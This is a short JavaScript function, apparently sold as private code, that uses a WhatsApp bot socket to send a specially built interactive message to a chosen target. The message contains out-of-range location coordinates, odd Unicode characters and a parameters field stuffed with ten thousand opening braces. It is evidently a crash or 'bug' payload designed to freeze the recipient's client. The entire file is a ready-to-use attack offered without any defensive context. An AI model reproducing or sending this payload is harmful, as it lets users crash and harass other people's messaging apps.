//NO SHARE NO JUAL PRIVATE THANKS FOR BUYING CREATED BY @vaacantivv Vaxzy

async function VxzXinvis(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "© Vaxzy4You",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "© Vaxzy4You",
                address: "ោ៝",
              },
            },
            body: {
              text: "© Vaxzy4You",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}